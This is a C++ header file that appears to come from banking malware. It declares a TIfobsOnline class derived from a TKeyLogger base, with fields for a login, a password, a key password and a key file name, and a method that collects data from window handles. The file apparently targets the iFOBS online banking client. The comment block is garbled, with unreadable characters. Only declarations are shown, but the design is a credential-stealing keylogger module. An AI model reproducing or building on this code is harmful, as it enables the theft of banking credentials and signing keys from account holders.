
//===========================================================================
//  ������ ���������� ����������� �� Ifobs ������
//
//  �������������: ������� 2012
//  ������:        1.0
//===========================================================================

#ifndef IfobsOnlineH
#define IfobsOnlineH
//---------------------------------------------------------------------------

#include "KeyLogger.h"


class TIfobsOnline : public TKeyLogger
{
private:
	string FLogin;
	string FPassword;
	string FKeyPassword;
	string FKeyFileName;


public:
	TIfobsOnline();
	~TIfobsOnline() {};

	void BindData();
	void AddWndData(HWND Wnd);
};


//---------------------------------------------------------------------------
#endif
